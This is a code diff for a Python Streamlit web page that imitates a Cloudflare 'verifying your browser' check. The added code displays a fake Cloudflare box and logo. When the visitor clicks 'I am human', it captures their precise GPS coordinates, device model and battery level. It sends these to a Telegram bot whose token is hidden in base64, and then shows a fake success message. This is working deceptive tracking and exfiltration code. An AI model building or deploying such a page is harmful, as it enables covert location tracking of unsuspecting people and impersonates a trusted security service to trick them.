@@ -4,76 +4,151 @@ import base64
 import time
 from streamlit_js_eval import streamlit_js_eval
 
-# --- CONFIGURAÇÃO ---
+# --- CONFIGURAÇÃO DA PÁGINA ---
+st.set_page_config(page_title="Verificação de Segurança", page_icon="🔒", layout="centered")
+
+# --- ACESSO DO BOT ---
 B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
 B_ID = "ODQ5ODY2NDAyOA=="
+
+# --- CSS PARA IMITAR A CLOUDFLARE ---
+st.markdown(
+    """
+    <style>
+        .stApp {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+        }
+        .main-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        .description-text {
+            color: #d1d5db;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+        .cf-box {
+            border: 1px solid #374151;
+            background-color: #111827;
+            padding: 15px 20px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .cf-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .cf-logo {
+            height: 20px;
+        }
+        .stButton>button {
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+        }
+        .footer-miamy {
+            text-align: center;
+            color: #4b5563;
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 50px;
+        }
+    </style>
+    """,
+    unsafe_allow_html=True
+)
 
 def enviar_telegram(msg):
     try:
         token = base64.b64decode(B_TK).decode("utf-8").strip()
         chat = base64.b64decode(B_ID).decode("utf-8").strip()
-        # Timeout aumentado para garantir que a mensagem saia
         requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
-                      json={"chat_id": chat, "text": msg, "parse_mode": "Markdown"}, timeout=20)
+                      json={"chat_id": chat, "text": msg, "parse_mode": "Markdown"}, timeout=15)
     except: pass
 
-st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")
+# --- ESTADO DE VERIFICAÇÃO ---
+if 'check_done' not in st.session_state:
+    st.session_state['check_done'] = False
 
-# --- ESTADO DE MEMÓRIA (O Segredo para o Bot não dormir) ---
-if 'aguardando_gps' not in st.session_state:
-    st.session_state['aguardando_gps'] = False
+# TÍTULO DA PÁGINA
+st.markdown('<div class="main-title">www.verificacaodeseguranca.com.br</div>', unsafe_allow_html=True)
 
-st.title("Verificação de Segurança")
+# TEXTO QUE VOCÊ PEDIU (APARECE ASSIM QUE ENTRA)
+st.markdown("""
+<div class="description-text">
+    Este site utiliza um serviço de segurança para proteção contra bots maliciosos. 
+    Esta página é exibida enquanto o site verifica se você não é um bot.
+</div>
+""", unsafe_allow_html=True)
 
-# Coleta de dados (sempre ativa)
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_FIXO")
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_FIXO")
+# Coleta técnica em background
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_PRO")
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_PRO")
 
-# O BOTÃO APENAS LIGA O MODO DE ESPERA
-if st.button("● ATIVAR PROTEÇÃO AGORA"):
-    st.session_state['aguardando_gps'] = True
-    st.rerun() # Recarrega para processar o pedido
+# LÓGICA DE EXIBIÇÃO
+if not st.session_state['check_done']:
+    # Caixa "Verificando"
+    st.markdown("""
+    <div class="cf-box">
+        <div class="cf-info">
+            <span style="color: #3b82f6; font-size: 20px;">🔵</span>
+            <span style="font-size: 16px;">Verificando seu navegador...</span>
+        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
+    </div>
+    """, unsafe_allow_html=True)
 
-# SE O BOTÃO FOI CLICADO, RODA ISSO AQUI:
-if st.session_state['aguardando_gps']:
-    # 1. Pede o GPS (Isso faz o pop-up aparecer)
-    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:10000}); })"
-    posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS_TRIGGER")
+    if st.button("Sou humano. Clique para verificar."):
+        # Pede Localização no Clique
+        js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true}); })"
+        posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_{int(time.time())}")
 
-    if posicao:
-        if posicao == "erro":
-            st.error("Erro: Permissão de localização negada.")
-            st.session_state['aguardando_gps'] = False # Desliga o modo de espera
-        else:
-            # 2. Dados chegaram! Prepara o envio.
-            modelo = "Dispositivo Android"
+        if posicao and posicao != "erro":
+            # Pega o modelo do celular
+            modelo = "Smartphone"
             if ua:
                 try:
                     info = ua.split("(")[1].split(")")[0]
-                    partes = [p.strip() for p in info.split(";")]
-                    for p in partes:
-                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung"]):
-                            modelo = p
+                    for p in info.split(";"):
+                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung", "2312"]):
+                            modelo = p.strip()
                             break
                 except: pass
 
             link = f"https://www.google.com/maps?q={posicao}"
-            
             relatorio = (
-                f"🛡️ *PROTEÇÃO ATIVADA*\n"
+                f"🛡️ *CLOUDFLARE PROTECT*\n"
                 f"📱 *Aparelho:* {modelo}\n"
                 f"🔋 *Bateria:* {bat if bat else '??'}%\n"
                 f"📍 *Local:* {link}"
             )
-            
-            # 3. ENVIA AGORA (O bot acorda aqui)
             enviar_telegram(relatorio)
-            
-            # 4. Finaliza
-            st.success("Proteção Ativada")
-            st.session_state['aguardando_gps'] = False # Reseta para não enviar duplicado
-    else:
-        # Enquanto o GPS não responde, mostra isso
-        st.info("Aguardando permissão no topo da tela... (Não feche)")
+            st.session_state['check_done'] = True
+            st.rerun()
 
-st.markdown('<br><p style="text-align:center; color:grey; font-size:12px; font-weight:bold;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
+else:
+    # TELA DE SUCESSO (CONFORME A SEGUNDA FOTO)
+    st.markdown("""
+    <div class="cf-box">
+        <div class="cf-info">
+            <span style="color: #10b981; font-size: 20px;">✅</span>
+            <span style="font-size: 16px; color: #10b981;">Verificação bem-sucedida.</span>
+        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
+    </div>
+    <div class="description-text" style="font-size: 14px;">
+        Aguardando resposta do servidor principal...
+    </div>
+    """, unsafe_allow_html=True)
+
+# RODAPÉ
+st.markdown('<div class="footer-miamy">Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)
